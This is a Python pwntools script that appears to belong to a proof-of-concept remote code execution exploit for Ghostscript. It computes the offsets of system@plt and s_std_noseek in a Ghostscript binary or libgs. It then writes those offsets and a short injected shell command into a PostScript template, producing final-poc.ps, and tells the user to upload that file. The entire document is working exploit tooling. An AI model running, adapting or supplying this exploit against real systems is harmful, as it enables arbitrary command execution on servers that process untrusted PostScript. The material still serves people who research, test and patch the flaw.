#!/usr/bin/env python
# python offset.py /path/to/gs/binary
# or
# python offset.py /path/to/libgs

# thanks to Laluka for the help

from pwn import *
from sys import argv

if len(argv) < 2:
    print("Usage: python {argv[0]} </path/to/gs_bin or libgs> [rce command(<=7Byte) default:id]")
    exit(1)


elf_path = argv[1]

if len(argv) > 2:
    rce_cmd = argv[2]
    rce = rce_cmd.encode()
    if len(rce) > 7 or len(rce) == 0:
        print("Invalid rce command: improper length; 0 < len(rce.encode()) < 8")
        exit(2)
else:
    rce_cmd = 'id'
rce = rce_cmd.encode().ljust(8, b'\0').hex()

# Load the ELF file
elf = ELF(elf_path)

# Get the address of the PLT
init_addr = elf.get_section_by_name('.init').header.sh_addr
print(".init start address: 0x{:x}".format(init_addr))

# Get the address of system@plt
system_plt_addr = elf.plt['system']
print("system@PLT address: 0x{:x}".format(system_plt_addr))
libc_plt_offset = system_plt_addr - init_addr
print("Offset from .init start addr to system@plt: 0x{:x} == {:d}".format(libc_plt_offset, libc_plt_offset))

f_addr_s_std_noseek = elf.functions["s_std_noseek"]
print("f_addr_s_std_noseek address: 0x{:x}".format(f_addr_s_std_noseek.address))
f_addr_s_std_noseek_offset = f_addr_s_std_noseek.address - init_addr
print("Offset from .init start addr to f_addr_s_std_noseek: 0x{:x} == {:d}".format(f_addr_s_std_noseek_offset, f_addr_s_std_noseek_offset))

print("The command to execute is: {}".format(rce_cmd))

with open("final-poc.ps.template", "r") as f:
    final_file = f.read().strip()

final_file = final_file.replace("F_ADDR_S_STD_NOSEEK_OFFSET", str(f_addr_s_std_noseek_offset))
final_file = final_file.replace("LIBC_PLT_OFFSET", str(libc_plt_offset))
final_file = final_file.replace("CMD_INJECT", rce)

with open("final-poc.ps", "w") as f:
    f.write(final_file)

print("Now try to upload the final-poc.ps")
